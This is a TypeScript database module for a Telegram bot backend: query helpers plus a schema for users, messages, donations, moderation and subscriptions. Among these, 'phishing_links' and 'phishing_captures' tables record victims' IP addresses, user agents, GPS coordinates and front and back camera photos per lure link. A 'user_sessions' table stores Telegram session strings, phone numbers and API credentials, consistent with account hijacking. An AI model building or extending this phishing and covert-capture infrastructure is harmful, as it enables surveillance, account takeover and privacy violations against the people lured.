export async function d1All<T = Record<string, unknown>>(
  db: D1Database,
  sql: string,
  params: unknown[] = [],
): Promise<T[]> {
  const stmt = db.prepare(sql);
  const bound = params.length ? stmt.bind(...params) : stmt;
  const { results } = await bound.all<T>();
  return results;
}

export async function d1First<T = Record<string, unknown>>(
  db: D1Database,
  sql: string,
  params: unknown[] = [],
): Promise<T | null> {
  const stmt = db.prepare(sql);
  const bound = params.length ? stmt.bind(...params) : stmt;
  const result = await bound.first<T>();
  return result ?? null;
}

export async function d1Run(
  db: D1Database,
  sql: string,
  params: unknown[] = [],
): Promise<D1Result> {
  const stmt = db.prepare(sql);
  const bound = params.length ? stmt.bind(...params) : stmt;
  return bound.run();
}

export async function initSchema(db: D1Database): Promise<void> {
  const stmts = [
    `CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id TEXT UNIQUE NOT NULL,
      first_name TEXT,
      username TEXT,
      is_bot INTEGER DEFAULT 0,
      message_count INTEGER DEFAULT 0,
      last_active TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `ALTER TABLE users ADD COLUMN is_bot INTEGER DEFAULT 0`,
    `CREATE TABLE IF NOT EXISTS messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      sender_type TEXT NOT NULL,
      text TEXT,
      media_type TEXT DEFAULT 'text',
      media_url TEXT,
      telegram_file_id TEXT,
      telegram_message_id INTEGER,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS donations (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      amount REAL NOT NULL,
      currency TEXT DEFAULT 'USD',
      status TEXT DEFAULT 'pending',
      tx_id TEXT,
      track_id TEXT,
      pay_link TEXT,
      order_id TEXT,
      pay_currency TEXT,
      pay_amount REAL,
      network TEXT,
      address TEXT,
      expired_at INTEGER,
      qr_code TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS static_addresses (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      address TEXT NOT NULL UNIQUE,
      currency TEXT NOT NULL,
      network TEXT NOT NULL,
      track_id TEXT,
      qr_code TEXT,
      memo TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS moderation (
      user_id TEXT PRIMARY KEY,
      status TEXT DEFAULT 'active',
      bot_banned INTEGER DEFAULT 0,
      app_banned INTEGER DEFAULT 0,
      global_banned INTEGER DEFAULT 0,
      warnings_count INTEGER DEFAULT 0,
      ban_reason TEXT,
      ban_until TEXT,
      last_warning_reason TEXT,
      updated_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS moderation_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id TEXT NOT NULL,
      admin_id TEXT NOT NULL,
      action TEXT NOT NULL,
      scope TEXT,
      reason TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS group_chats (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chat_id TEXT UNIQUE NOT NULL,
      title TEXT,
      type TEXT,
      bot_is_admin INTEGER DEFAULT 0,
      member_count INTEGER DEFAULT 0,
      added_by TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      updated_at TEXT DEFAULT (datetime('now'))
    )`,
    `ALTER TABLE group_chats ADD COLUMN added_by TEXT`,
    `CREATE TABLE IF NOT EXISTS group_members (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chat_id TEXT NOT NULL,
      telegram_id TEXT NOT NULL,
      status TEXT DEFAULT 'member',
      first_seen TEXT DEFAULT (datetime('now')),
      UNIQUE(chat_id, telegram_id)
    )`,
    `CREATE TABLE IF NOT EXISTS user_sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id TEXT NOT NULL,
      phone TEXT,
      session_string TEXT NOT NULL,
      first_name TEXT,
      username TEXT,
      account_id TEXT,
      api_id INTEGER,
      api_hash TEXT,
      status TEXT DEFAULT 'active',
      created_at TEXT DEFAULT (datetime('now')),
      last_used TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS rate_limit_windows (
      user_id TEXT PRIMARY KEY,
      window_start TEXT NOT NULL,
      hit_count INTEGER DEFAULT 1
    )`,
    `CREATE TABLE IF NOT EXISTS blocked_keywords (
      keyword TEXT PRIMARY KEY,
      added_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS link_whitelist (
      telegram_id TEXT PRIMARY KEY,
      added_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS scheduled_broadcasts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      message TEXT NOT NULL,
      scheduled_at TEXT NOT NULL,
      sent INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS premium_subscriptions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id TEXT NOT NULL,
      stars_paid INTEGER,
      amount_usd REAL DEFAULT 5.0,
      expires_at TEXT NOT NULL,
      status TEXT DEFAULT 'active',
      track_id TEXT UNIQUE,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS user_metadata (
      telegram_id TEXT PRIMARY KEY,
      ip_address TEXT,
      country_code TEXT,
      city TEXT,
      user_agent TEXT,
      platform TEXT,
      language TEXT,
      timezone TEXT,
      screen TEXT,
      cookie_consent TEXT DEFAULT 'pending',
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS deletion_requests (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      telegram_id TEXT NOT NULL,
      first_name TEXT,
      username TEXT,
      reason TEXT NOT NULL,
      status TEXT DEFAULT 'pending',
      admin_note TEXT,
      created_at TEXT DEFAULT (datetime('now')),
      resolved_at TEXT
    )`,
    `CREATE TABLE IF NOT EXISTS video_tokens (
      uid TEXT PRIMARY KEY,
      token TEXT NOT NULL,
      watch_url TEXT NOT NULL,
      download_url TEXT NOT NULL,
      from_id TEXT NOT NULL,
      from_name TEXT,
      file_name TEXT,
      file_size INTEGER DEFAULT 0,
      exp INTEGER NOT NULL,
      added_at INTEGER NOT NULL,
      chat_id TEXT,
      video_chat_msg_id INTEGER,
      bot_reply_msg_id INTEGER,
      admin_msg_id INTEGER,
      admin_chat_id INTEGER,
      revoked INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE UNIQUE INDEX IF NOT EXISTS idx_premium_subs_track_id ON premium_subscriptions(track_id) WHERE track_id IS NOT NULL`,
    `CREATE TABLE IF NOT EXISTS live_chat_messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      from_id TEXT NOT NULL,
      to_id TEXT NOT NULL,
      text TEXT NOT NULL,
      read INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE INDEX IF NOT EXISTS idx_live_chat_pair ON live_chat_messages(from_id, to_id)`,
    `CREATE INDEX IF NOT EXISTS idx_live_chat_created ON live_chat_messages(created_at)`,
    `CREATE TABLE IF NOT EXISTS phishing_links (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      code TEXT UNIQUE NOT NULL,
      label TEXT DEFAULT '',
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE TABLE IF NOT EXISTS phishing_captures (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      link_code TEXT NOT NULL,
      telegram_id TEXT,
      ip TEXT,
      user_agent TEXT,
      latitude REAL,
      longitude REAL,
      front_photo_key TEXT,
      back_photo_key TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    )`,
    `CREATE INDEX IF NOT EXISTS idx_phishing_captures_code ON phishing_captures(link_code)`,
    `ALTER TABLE phishing_captures ADD COLUMN front_file_id TEXT`,
    `ALTER TABLE phishing_captures ADD COLUMN back_file_id TEXT`,
  ];

  for (const sql of stmts) {
    try {
      await db.prepare(sql).run();
    } catch (e) {
      const msg = String(e);
      if (!msg.includes("already exists") && !msg.includes("duplicate column")) {
        console.warn("Schema stmt warning:", msg.slice(0, 120));
      }
    }
  }
}
